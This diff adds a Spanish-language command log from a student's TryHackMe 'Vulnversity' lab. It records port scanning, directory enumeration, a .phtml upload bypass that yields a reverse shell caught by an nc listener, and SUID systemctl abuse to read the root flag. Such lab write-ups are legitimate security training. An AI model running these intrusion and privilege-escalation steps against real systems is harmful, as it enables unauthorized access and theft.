@@ -1,0 +1,55 @@
+===========================================================
+BITACORA DE COMANDOS - Sala: Vulnversity (TryHackMe)
+Alumno: Arturo Marin  |  Username THM: marinarturo
+Objetivo inicial: 10.67.178.161
+Objetivo tras reinicio de la maquina: 10.65.174.55
+Fecha: 2026-10-07
+Secretos reemplazados por [REDACTED] antes de subir la bitacora.
+===========================================================
+
+# --- FASE: ESCANEO ---
+# El escaneo por defecto (1000 puertos) no mostro servicios abiertos.
+nmap -sC -sV -oN nmap_vulnversity.txt 10.67.178.161
+# Host up. 1000 puertos closed/conn-refused. Nmap 7.991.
+# Inicio de esa corrida: 2026-10-07 00:00:06 -0300.
+
+# Escaneo de los 65535 puertos, con deteccion de servicios.
+nmap -sC -sV -p- -oN nmap_vulnversity_full.txt 10.67.178.161
+# Inicio: 2026-10-07 00:10:29. Fin: 00:59:39. Duracion: 2949.91 s.
+# 21/ftp vsftpd 3.0.5
+# 22/ssh OpenSSH 8.2p1 Ubuntu
+# 139 y 445/netbios-ssn Samba smbd 4
+# 3128/http-proxy Squid 4.10
+# 3333/http Apache 2.4.41 (Ubuntu), titulo "Vuln University"
+
+# --- FASE: ENUMERACION WEB (puerto 3333) ---
+gobuster dir -u http://10.67.178.161:3333 -w /usr/share/wordlists/dirb/common.txt
+# Directorio relevante: /internal/ (formulario de subida).
+# /internal/uploads/ tenia listado de directorio habilitado.
+
+# --- FASE: EXPLOTACION ---
+# El formulario acepto un script PHP con extension .phtml (shell.phtml).
+# El archivo quedo en /internal/uploads/shell.phtml.
+# Listener en el puesto de ataque:
+nc -lvnp 443
+# Al solicitar la URL del .phtml, la maquina devolvio una shell como www-data.
+# La sesion de post-explotacion que figura en las capturas es la de
+# 10.65.174.55 (la maquina se habia reiniciado; la IP de laboratorio cambio).
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+whoami
+cat /home/bill/user.txt
+# user.txt: [REDACTED]
+
+# --- FASE: POST-EXPLOTACION ---
+find / -perm -4000 -type f 2>/dev/null
+# Binario relevante: /bin/systemctl con bit SUID (root).
+ls -la /bin/systemctl
+
+# Se registro un servicio oneshot en /tmp cuyo ExecStart leia
+# /root/root.txt y copiaba el resultado a /tmp/rootflag.txt.
+/bin/systemctl link /tmp/exploit.service
+/bin/systemctl enable --now /tmp/exploit.service
+cat /tmp/rootflag.txt
+# root flag: [REDACTED]
+# Sala completada al 100 %. Hashes en el Anexo C del informe.
